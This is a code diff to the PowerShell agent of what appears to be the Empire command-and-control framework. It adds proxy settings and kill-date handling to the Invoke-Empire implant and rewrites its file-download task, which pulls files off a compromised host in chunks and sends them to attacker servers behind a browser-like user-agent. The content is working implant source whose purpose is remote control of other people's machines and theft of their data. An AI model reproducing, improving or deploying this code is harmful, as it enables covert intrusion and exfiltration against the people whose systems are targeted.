@@ -71,6 +71,9 @@ function Invoke-Empire {
         [String]
         $WorkingHours,
 
+        [object]
+        $ProxySettings,
+
         [String]
         $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
 
@@ -95,7 +98,9 @@ function Invoke-Empire {
     $script:LostLimit = $LostLimit
     $script:MissedCheckins = 0
     $script:ResultIDs = @{}
+    $script:WorkingHours = $WorkingHours
     $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
+    $Script:Proxy = $ProxySettings
 
     # the currently active server
     $Script:ServerIndex = 0
@@ -107,6 +112,10 @@ function Invoke-Empire {
     # set a kill date of $KillDays out if specified
     if($KillDays) {
         $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
+    }
+
+    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
+        $script:KillDate = $KillDate
     }
 
     # get all the headers/etc. in line for our comms
@@ -209,11 +218,11 @@ function Invoke-Empire {
     function Set-WorkingHours {
         param([string]$hours)
         $script:WorkingHours = $hours
-        "agent working hours set to $script:WorkingHours"
+        "agent working hours set to $($script:WorkingHours)"
     }
 
     function Get-WorkingHours {
-        "agent working hours: $script:WorkingHours"
+        "agent working hours: $($script:WorkingHours)"
     }
 
     function Get-Sysinfo {
@@ -541,7 +550,7 @@ function Get-FilePart {
         # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
         $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
 
-        $ScriptString = "$ScriptString`n Download-File -Type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
+        $ScriptString = "$ScriptString`n Download-File -Type $type -Path `"$Path`" -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
 
         # add the target script into the new runspace/appdomain
         $null = $PSHost.AddScript($ScriptString)
@@ -924,44 +933,31 @@ function Get-FilePart {
             elseif($type -eq 41) {
                 
                 try {
-                    $ChunkSize = 128KB
 
-                    $Parts = $Data.Split(" ")
-
-                    if($Parts.Length -gt 1) {
-                        $Path = $Parts[0..($parts.length-2)] -join " "
-                        try {
-                            $ChunkSize = $Parts[-1]/1
-                            if($Parts[-1] -notlike "*b*") {
-                                # if MB/KB not specified, assume KB and adjust accordingly
-                                $ChunkSize = $ChunkSize * 1024
-                            }
-                        }
-                        catch {
-                            # if there's an error converting the last token, assume no
-                            #   chunk size is specified and add the last token onto the path
-                            $Path += " $($Parts[-1])"
-                        }
-                    }
-                    else {
-                        $Path = $Data
-                    }
+                    $Path = $Data
 
                     $Path = $Path.Trim('"').Trim("'")
 
-                    # hardcoded floor/ceiling limits
-                    if($ChunkSize -lt 64KB) {
-                        $ChunkSize = 64KB
-                    }
-                    elseif($ChunkSize -gt 4MB) {
-                        $ChunkSize = 4MB
-                    }
-
-                    # resolve the complete path
+                    # Resolve the full path
                     $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
 
+                    # Get the file size to determine the ChunkSize
+                    $fileSize = (Get-Item $Path).Length
+
+                    # hardcoded floor/ceiling limits
+                    if($fileSize -lt 64KB) {
+                        $ChunkSize = 64KB
+                    }
+                    elseif($fileSize -gt 4MB) {
+                        $ChunkSize = 4MB
+                    }
+                    else {
+                        $ChunkSize = 128KB
+                    }
+                   
                     # read in and send the specified chunk size back for as long as the file has more parts
                     $jobID = Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
+                    
                     
                 }
                 catch {
@@ -1261,8 +1257,6 @@ function Get-FilePart {
             }
             else {
                 $Results = Receive-DownloadJob -JobName $JobName
-                
-                
             }
 
             if($Results) {
